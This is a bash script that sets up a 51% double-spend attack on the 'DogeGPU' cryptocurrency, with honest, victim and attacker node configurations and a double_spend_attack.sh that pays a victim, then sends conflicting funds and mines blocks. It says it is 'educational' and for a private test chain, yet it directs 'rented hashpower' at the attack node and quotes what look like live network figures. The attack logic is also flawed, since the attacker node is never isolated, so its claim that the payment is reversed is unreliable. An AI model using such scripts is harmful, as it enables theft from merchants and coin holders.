#!/bin/bash

# DogeGPU 51% Attack Setup Script
# Educational purposes only - for your private test chain

DOGPU_PATH="/workspace/Dogpu/DogeGPU-master/src"
ATTACK_DIR="/workspace/attack_setup"

echo "🎯 Setting up DogeGPU 51% Attack Environment"
echo "=============================================="

# Copy binaries
cp $DOGPU_PATH/dogpud $ATTACK_DIR/
cp $DOGPU_PATH/dogpu-cli $ATTACK_DIR/
chmod +x $ATTACK_DIR/dogpud $ATTACK_DIR/dogpu-cli

echo "✅ Binaries copied"

# Create configuration files for different nodes
cat > $ATTACK_DIR/honest_node/dogpu.conf << EOF
# Honest Node Configuration
rpcuser=honest
rpcpassword=honest123
rpcport=8332
port=8333
datadir=$ATTACK_DIR/honest_node
server=1
daemon=1
gen=0
maxconnections=20
EOF

cat > $ATTACK_DIR/attack_node/dogpu.conf << EOF
# Attack Node Configuration  
rpcuser=attacker
rpcpassword=attack123
rpcport=8334
port=8335
datadir=$ATTACK_DIR/attack_node
server=1
daemon=1
gen=1
genproclimit=-1
maxconnections=50
addnode=127.0.0.1:8333
EOF

cat > $ATTACK_DIR/victim_node/dogpu.conf << EOF
# Victim Node Configuration
rpcuser=victim
rpcpassword=victim123
rpcport=8336
port=8337
datadir=$ATTACK_DIR/victim_node
server=1
daemon=1
gen=0
maxconnections=20
addnode=127.0.0.1:8333
addnode=127.0.0.1:8335
EOF

echo "✅ Configuration files created"

# Create attack scripts
cat > $ATTACK_DIR/start_honest.sh << 'EOF'
#!/bin/bash
echo "🟢 Starting Honest Node..."
./dogpud -conf=honest_node/dogpu.conf -datadir=honest_node
EOF

cat > $ATTACK_DIR/start_attack.sh << 'EOF'
#!/bin/bash
echo "🔴 Starting Attack Node..."
./dogpud -conf=attack_node/dogpu.conf -datadir=attack_node
EOF

cat > $ATTACK_DIR/start_victim.sh << 'EOF'
#!/bin/bash
echo "🟡 Starting Victim Node..."
./dogpud -conf=victim_node/dogpu.conf -datadir=victim_node
EOF

cat > $ATTACK_DIR/double_spend_attack.sh << 'EOF'
#!/bin/bash
echo "💀 EXECUTING DOUBLE SPEND ATTACK"
echo "================================="

# Step 1: Create transaction to victim
echo "1. Creating transaction to victim..."
VICTIM_ADDR=$(./dogpu-cli -rpcport=8336 -rpcuser=victim -rpcpassword=victim123 getnewaddress)
echo "Victim address: $VICTIM_ADDR"

# Step 2: Send coins to victim (this will be double-spent)
echo "2. Sending coins to victim..."
TXID=$(./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 sendtoaddress $VICTIM_ADDR 100)
echo "Transaction ID: $TXID"

# Step 3: Wait for victim to see transaction
echo "3. Waiting for victim to see transaction..."
sleep 10

# Step 4: Create conflicting transaction (double spend)
echo "4. Creating conflicting transaction..."
ATTACKER_ADDR=$(./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 getnewaddress)
./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 sendtoaddress $ATTACKER_ADDR 100

# Step 5: Mine private chain with superior hashpower
echo "5. Mining private chain with superior hashpower..."
./dogpu-cli -rpcport=8334 -rpcuser=attacker -rpcpassword=attack123 generate 10

echo "💀 Double spend attack executed!"
echo "Check victim node - the original transaction should be reversed"
EOF

chmod +x $ATTACK_DIR/*.sh

echo "✅ Attack scripts created"
echo ""
echo "🎯 ATTACK SETUP COMPLETE!"
echo "========================="
echo ""
echo "Next steps:"
echo "1. ./start_honest.sh    - Start the honest network"
echo "2. ./start_victim.sh    - Start victim node"  
echo "3. ./start_attack.sh    - Start your attack node"
echo "4. ./double_spend_attack.sh - Execute the attack!"
echo ""
echo "Your rented hashpower should connect to: 127.0.0.1:8335"
echo "Current network hashrate: 970MH/s"
echo "Block height: 1861257"